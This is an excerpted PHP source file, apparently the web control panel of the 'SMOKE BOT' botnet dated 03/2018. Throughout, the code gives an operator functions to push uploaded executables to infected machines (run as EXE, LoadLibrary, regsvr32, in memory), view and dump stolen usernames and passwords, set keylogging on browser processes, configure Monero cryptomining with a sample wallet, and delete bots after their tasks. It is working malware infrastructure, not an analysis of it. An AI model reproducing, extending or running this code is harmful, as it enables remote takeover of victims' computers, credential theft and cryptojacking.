...
//action.php functional now here
//search bots
...
//miner funcs
if (isset($_POST["mode"]) && $_POST["mode"] === "miner"){
	$miner_rules = "";
	if (!empty($_POST["miner_pool"]) && !empty($_POST["miner_login"]) && !empty($_POST["miner_pass"])) $miner_rules = trim($_POST["miner_pool"])." ".trim($_POST["miner_login"])." ".trim($_POST["miner_pass"]);
	mysqli_query($dbcon,"UPDATE `plugins` SET `miner_rules`='{$miner_rules}'");
	die(header("Location: {$referrer}"));
}
//task edit
...
if (!empty($_FILES["updname"]["name"])){
	//if (!isencrypted($_FILES["updname"]["tmp_name"])) die("Task not encrypted. Read readme.txt");
...
if (!empty($act)){
	if ($act !== "edit"){
		switch ($act){
			...
			case "showlog":
				if (!empty($id)){
					...
					while ($v = mysqli_fetch_assoc($r)){
						...
						$stealer_user = htmlspecialchars($v["user"]);
						$stealer_pass = htmlspecialchars($v["pass"]);
						$out.= "{$v["cname"]} | ".date("d.m.Y H:i:s",$v["time"])." | {$STEALER[$v["softid"]]} | {$stealer_host} | {$stealer_user} | {$stealer_pass}<br/>";
					}
					die($out);
				}
				break;
			case "showalllog":
				$out = "";
				$r = mysqli_query($dbcon,"SELECT * FROM `stealer`");
				while ($v = mysqli_fetch_assoc($r)){
					$stealer_host = htmlspecialchars($v["host"]);
					$stealer_user = htmlspecialchars($v["user"]);
					$stealer_pass = htmlspecialchars($v["pass"]);
...
<div id="main">
		...
		<?php
			...
			if ($status == 1){
				...
				if ($plugins[2]) $menu .= "<li><a href=\"?page=miner\"> MINER </a></li>";
		...
		?>
			...
			<div id="status">SMOKE BOT | rev. 03/2018<br><br><?php echo "EKEY: ".sprintf("0x%08X",encryptkey)."<br>DKEY: ".sprintf("0x%08X",decryptkey)."<br><br>DATE: ".date("d.m.Y",time())."<br>TIME: ".date("H:i:s",time());?></div>
		</div>
		<div id="data">
<?php
				...
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					...
					<input type=\"submit\" value=\"UPLOAD\"><br><br>
						<table cols=\"4\" width=\"400px\">Options:
							<tr>
								<td><input type=\"radio\" name=\"start\" value=\"0\" {$checked1}>Run as EXE</td>
								<td><input type=\"radio\" name=\"start\" value=\"1\" {$checked2}>LoadLibrary</td>
								<td><input type=\"radio\" name=\"start\" value=\"2\" {$checked3}>regsvr32</td>
								<td><input type=\"radio\" name=\"start\" value=\"3\" {$checked4}>Run Mem</td>
							</tr>
							<tr>
							...
							<tr>
								<td colspan=\"4\"><input type=\"checkbox\" name=\"delafter\" value=\"1\" {$checked8}>Delete bot after complete tasks</td>
							</tr>
						</table>
				</form>
			</td>
...
if(empty($page) || $page === "index"){
	...
	<table id=\"bots\">
		...
		<tr>
			...
			<th align=\"center\">Privileges</th>";
			if ($htv_state) $botlist_tab .= "<th align=\"center\">HTV ID</th><th align=\"center\">HTV PASS</th>";
			$botlist_tab .= "
				...
				<tr>
					<td align=\"left\">
						<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
							...
							<input type=\"file\" name=\"file\">
							<input type=\"submit\" value=\"UPLOAD\"><br><br>
								<table cols=\"3\" width=\"400px\">Options:
									<tr>
										<td><input type=\"radio\" name=\"start\" value=\"0\" checked>Run as EXE</td>
										<td><input type=\"radio\" name=\"start\" value=\"1\">LoadLibrary</td>
										<td><input type=\"radio\" name=\"start\" value=\"2\">regsvr32</td>
										<td><input type=\"radio\" name=\"start\" value=\"3\">Run Mem</td>
									</tr>
								</table>
						</form>
					</td>
						...
						<td align=\"left\">
							<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
								...
								<table cols=\"4\">Options:
									...
									<tr>
										<td colspan=\"4\"><input type=\"checkbox\" name=\"delafter\" value=\"1\">Delete bot after complete tasks</td>
									</tr>
								</table>
							</form>
						</td>
		...
		if ($url_pattern !== "" || $id_pattern !== ""){
			...
			if ($total_rows > 0){
				...
				while ($res = mysqli_fetch_assoc($req)){
					$reports .= "<tr class=\"blank\"><td align=\"center\" colspan=\"2\">{$res["cname"]}</td><td align=\"center\">{$res["cnt"]}</td><td align=\"center\"><a class=\"action\" target=\"_blank\" href=\"?act=showlog&id={$res["cname"]}\">Show</a> | <a class=\"action\" href=\"?act=dellog&id={$res["cname"]}\" onclick=\"return confirm('Are you sure?')\">Delete</a></td></tr>";
				}
			}
		} else $num_pages = 0;
		$showsr = true;
	...
	echo "
		<tr class=\"bottom\">
			<td align=\"center\" colspan=\"4\"><a class=\"action\" target=\"_blank\" href=\"?act=showalllog\">Show All</a> | <a class=\"action\" href=\"?act=delalllog\" onclick=\"return confirm('Are you sure?')\">Delete 	all reports from DB</a></td>
		</tr>
	</table>";
} elseif ($page === "fgrab"){
	$showsr = false;
	...
	<table id=\"info\">
		...
		<tr>
			<td>Syntax:<br><br><span style=\"text-transform:none;\">procname1.ext,procname2.ext</span> (where \",\" - separator for each new process for keylogging)<br><br>Sample:<br><br><span style=\"text-transform:none;\">iexplore.exe,opera.exe,chrome.exe,firefox.exe</span> (keylogger will work only for this processes)<br><br>All results saved in \"/keylogger/botid/\" folder (use any ftp client or hosting panel for access)</td>
		</tr>
	</table>";
} elseif ($page === "miner"){
	$miner_pool = "";
	$miner_login = "";
	$miner_pass = "";
	$req = mysqli_query($dbcon,"SELECT `miner_rules` FROM `plugins`");
	$res = mysqli_fetch_assoc($req);
	if (!empty($res["miner_rules"])){
		$miner = explode(" ",$res["miner_rules"]);
		$miner_pool = $miner[0];
		$miner_login = $miner[1];
		$miner_pass = $miner[2];
	}
	...
	<table id=\"task\">
		<tr>
			<th align=\"center\">Crypto Mining Settings</th>
		</tr>
		<tr>
			<td align=\"center\">
				<form method=\"post\" action=\"\">
					Pool: <input type=\"input\" name=\"miner_pool\" size=\"30\" value=\"{$miner_pool}\"> Login: <input type=\"input\" name=\"miner_login\" size=\"20\" value=\"{$miner_login}\"> Password: <input type=\"input\" 	name=\"miner_pass\" size=\"20\" value=\"{$miner_pass}\"><input type=\"hidden\" name=\"mode\" value=\"miner\">
					<input type=\"submit\" value=\"SAVE\">
				</form>
			</td>
		</tr>
		...
		<tr>
			<td>Status: only Monero (XMR) CPU mining supported<br><br>Sample:<br><br>POOL: <span style=\"text-transform:none;\">pool.supportxmr.com:3333 (stratum+tcp supported)</span><br>LOGIN: <span style=\"text-transform:none;\">4581HhZkQHgZrZjKeCfCJxZff9E3xCgHGF25zABZz7oR71TnbbgiS7sK9jveE6Dx6uMs2LwszDuvQJgRZQotdpHt1fTdDhk (in sample - wallet address)</span><br>PASSWORD: <span style=\"text-transform:none;\">x (put \"x\" if no password)</span><br></td>
		</tr>
	</table>";
} elseif ($page === "egrab"){
	$emails = "";
